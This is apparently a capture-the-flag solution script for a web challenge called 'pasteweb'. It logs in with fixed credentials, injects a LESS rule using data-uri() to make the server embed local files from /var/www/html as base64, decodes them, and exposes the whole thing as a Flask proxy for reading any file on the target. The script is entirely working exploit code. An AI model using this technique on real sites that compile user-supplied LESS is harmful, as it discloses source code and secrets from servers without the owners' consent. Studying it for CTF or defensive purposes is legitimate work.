from flask import Flask, request
import requests
from datetime import datetime
import bs4
from base64 import b64decode

sess = requests.session()
sess.get("https://pasteweb.ctf.zoolab.org/")
sess.post("https://pasteweb.ctf.zoolab.org/", data={
    "username":"asef18766",
    "password":"asef18766",
    "current_time":int(datetime.now().timestamp())
})

def get_view():
    with sess.get("https://pasteweb.ctf.zoolab.org/view.php") as resp:
        raw_resp = resp.text
        #print(resp.text)
        sp = bs4.BeautifulSoup(raw_resp, features="html.parser").find("style")
        res = sp.getText().strip()
        res = res[res.find('base64,'):res.find('");')]
        res = res[7:]
        return b64decode(res)

def set_path(path:str):
    with sess.post("https://pasteweb.ctf.zoolab.org/editcss.php", data={"less":f"p {{ color: data-uri('{path}'); }}"}) as resp:
        assert resp.status_code == 200

app = Flask(__name__)
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def get_file(path:str):
    set_path(f"/var/www/html/{path}")
    return get_view()

if __name__ == "__main__":
    app.run("192.168.146.1")